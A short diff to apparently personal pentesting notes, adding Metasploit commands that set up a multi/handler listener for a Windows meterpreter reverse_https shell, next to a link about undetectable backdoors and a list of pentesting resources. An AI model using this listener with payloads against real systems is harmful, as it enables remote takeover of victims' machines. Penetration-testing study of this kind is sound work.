@@ -72,6 +72,16 @@ and you'll have to experiment with the different payloads
 and different options until you get it to work.  
 Undetectable Backdoors Advance: https://www.youtube.com/watch?v=cgM-_42rWbM  
 
+Listening For Incoming Connections
+```
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 10.10.10.10
+set LPORT 8080
+exploit
+```
+
 ## Pentesting Resources
 https://github.com/swisskyrepo/PayloadsAllTheThings  
 https://pentestmonkey.net/  
